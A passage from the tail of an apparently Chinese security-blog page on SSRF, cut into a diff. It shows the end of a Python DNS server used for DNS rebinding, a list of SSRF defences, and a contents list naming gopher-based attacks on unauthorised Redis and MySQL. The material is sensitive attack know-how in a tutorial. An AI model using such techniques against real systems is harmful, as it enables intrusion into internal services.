+    <span class="n">protocol</span> <span class="o">=</span> <span class="n">dns</span><span class="o">.</span><span class="n">DNSDatagramProtocol</span><span class="p">(</span><span class="n">controller</span><span class="o">=</span><span class="n">factory</span><span class="p">)</span>
+    <span class="n">reactor</span><span class="o">.</span><span class="n">listenUDP</span><span class="p">(</span><span class="mi">53</span><span class="p">,</span> <span class="n">protocol</span><span class="p">)</span>
+    <span class="n">reactor</span><span class="o">.</span><span class="n">run</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+    <span class="k">raise</span> <span class="ne">SystemExit</span><span class="p">(</span><span class="n">main</span><span class="p">())</span>
+</code></pre></div><h2 id="防御">防御</h2>
+<ul>
+<li>禁用不需要的协议，仅仅允许http和https请求。防止类似于<code>file、gopher、ftp</code> 等引起的问题</li>
+<li>设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP）</li>
+<li>限制端口</li>
+<li>验证返回内容：根据请求资源的类型验证返回内容是否符合该类型格式</li>
+<li>统一错误信息和回显内容</li>
+</ul>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>Licensed under CC BY-NC-SA 4.0</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    <aside class="related-contents--wrapper">
+    
+    
+        <h2 class="section-title">相关文章</h2>
+        <div class="related-contents">
+            <div class="flex article-list--tile">
+                
+                    
+<article class="has-image">
+    <a href="/p/csrf/">
+        
+        
+            <div class="article-image">
+                <img src="/p/csrf/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post CSRF 相关"
+                        data-key="csrf" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">CSRF 相关</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/mssql/">
+        
+        
+            <div class="article-image">
+                <img src="/p/mssql/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post MSSQL 注入与提权相关"
+                        data-key="mssql" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">MSSQL 注入与提权相关</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/mysql-1/">
+        
+        
+            <div class="article-image">
+                <img src="/p/mysql-1/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post MySQL 提权"
+                        data-key="mysql-1" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">MySQL 提权</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/mysql-2/">
+        
+        
+            <div class="article-image">
+                <img src="/p/mysql-2/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post MySQL 注入写 shell"
+                        data-key="mysql-2" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">MySQL 注入写 shell</h2>
+        </div>
+    </a>
+</article>
+                
+                    
+<article class="has-image">
+    <a href="/p/php-2/">
+        
+        
+            <div class="article-image">
+                <img src="/p/php-2/_hud7e36f7e20e71be184458283bdae4646_55974_23a5d351d2fc2374f952239b6e9c423a.jpg" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post PHP 反序列化-2"
+                        data-key="php-2" 
+                        data-hash="md5-xRTZFpFxc6SKQuARS0aZYQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">PHP 反序列化-2</h2>
+        </div>
+    </a>
+</article>
+                
+            </div>
+        </div>
+    
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2020 - 
+        
+        2022 cOOl &#39;s blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.5.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer="true"
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css"integrity="sha256-c0uckgykQ9v5k&#43;IqViZOZKc47Jn7KQil4/MP3ySA3F8="crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css"integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE="crossorigin="anonymous"
+            >
+
+            </main>
+    
+        <aside class="sidebar right-sidebar sticky">
+            <section class="widget archives">
+                <div class="widget-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+                </div>
+                <h2 class="widget-title section-title">目录</h2>
+                
+                <div class="widget--toc">
+                    <nav id="TableOfContents">
+  <ol>
+    <li><a href="#定义">定义</a></li>
+    <li><a href="#原理">原理</a></li>
+    <li><a href="#常见漏洞场景">常见漏洞场景</a>
+      <ol>
+        <li><a href="#加载图片等资源">加载图片等资源</a></li>
+        <li><a href="#分享功能">分享功能</a></li>
+        <li><a href="#收藏功能">收藏功能</a></li>
+        <li><a href="#网页源代码中查找带有关键词的url或接口">网页源代码中查找带有关键词的url或接口</a></li>
+        <li><a href="#php中常见的可能引发ssrf的函数">PHP中常见的可能引发SSRF的函数</a></li>
+      </ol>
+    </li>
+    <li><a href="#常见利用方式">常见利用方式</a></li>
+    <li><a href="#常用协议">常用协议</a>
+      <ol>
+        <li><a href="#file">file</a></li>
+        <li><a href="#dict">dict</a></li>
+        <li><a href="#gopher">Gopher</a>
+          <ol>
+            <li><a href="#协议格式">协议格式</a></li>
+            <li><a href="#gopher协议构造getpost请求">gopher协议构造GET、POST请求</a></li>
+          </ol>
+        </li>
+        <li><a href="#漏洞利用">漏洞利用</a>
+          <ol>
+            <li><a href="#获取本地信息">获取本地信息</a></li>
+            <li><a href="#攻击未授权redis">攻击未授权Redis</a></li>
+            <li><a href="#攻击未授权mysql">攻击未授权MySQL</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#绕过方式">绕过方式</a>
+      <ol>
+        <li><a href="#ip">IP</a></li>
+        <li><a href="#dns-重绑定">DNS 重绑定</a>
+          <ol>
+            <li><a href="#原理-1">原理</a></li>
+            <li><a href="#利用">利用</a></li>
+          </ol>
+        </li>
+      </ol>
+    </li>
+    <li><a href="#防御">防御</a></li>
+  </ol>
+</nav>
+                </div>
+            </section>
+        </aside>
+    
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
+                defer="false"
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
